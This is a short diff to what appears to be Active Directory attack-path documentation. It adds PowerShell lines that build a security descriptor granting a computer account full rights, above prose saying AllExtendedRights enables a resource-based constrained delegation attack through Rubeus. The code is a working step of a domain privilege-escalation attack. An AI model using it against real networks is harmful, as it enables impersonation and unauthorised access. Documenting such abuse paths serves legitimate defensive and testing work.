@@ -1,3 +1,6 @@
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
 AllExtendedRights on a computer object can be used to perform a resource based constrained delegation attack.
 
 Abusing this primitive is possible through the Rubeus project.
